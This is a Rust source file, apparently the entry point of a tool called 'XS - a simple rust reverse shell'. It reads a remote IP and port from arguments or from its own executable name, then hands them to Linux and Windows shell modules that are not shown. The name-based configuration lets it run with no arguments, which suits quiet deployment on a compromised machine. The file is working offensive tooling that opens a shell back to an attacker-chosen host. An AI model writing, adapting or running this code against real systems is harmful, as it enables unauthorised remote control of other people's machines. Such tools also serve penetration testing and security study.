use clap::{Arg, App};

#[cfg(unix)]
mod linux;

#[cfg(windows)]
mod windows;

#[cfg(unix)]
fn shell(ip: String, port: String){
    linux::shell(ip, port);
}

#[cfg(windows)]
fn shell(ip: String, port: String){
    windows::shell(ip, port);
}

fn main() {
    let matches = App::new("XS - a simple rust reverse shell")
        .version("1.0.0")
        .author("xct <xct@vulndev.io>")
        .arg(Arg::new("ip")                
                 .help("remote ip"))
        .arg(Arg::new("port")              
                 .help("remote port"))
        .get_matches();

    let mut ip = String::from("");
    let mut port = String::from("");

    let name = std::env::current_exe()
        .expect("Can't get the exec path")
        .file_name()
        .expect("Can't get the exec name")
        .to_string_lossy()
        .into_owned();
    //println!("[+] Running {}", name);

    if name.contains("_") {
        let parts = name.split("_").collect::<Vec<&str>>();
        if parts.len() == 3 {
            ip = parts[1].to_string();
            port = parts[2].to_string();
        }
    } else {
        if let Some(i) = matches.value_of("ip"){
            ip = i.to_string();
        }
        if let Some(i) = matches.value_of("port"){
            port = i.to_string();
        }
    }    
    if ip.len() == 0 || port.len() == 0{
        //println!("Usage: rcat <ip> <port> || rcat_ip_port");
        return;   
    }
    //println!("[+] Connection to {}:{}", ip, port);   
    shell(ip, port);
}
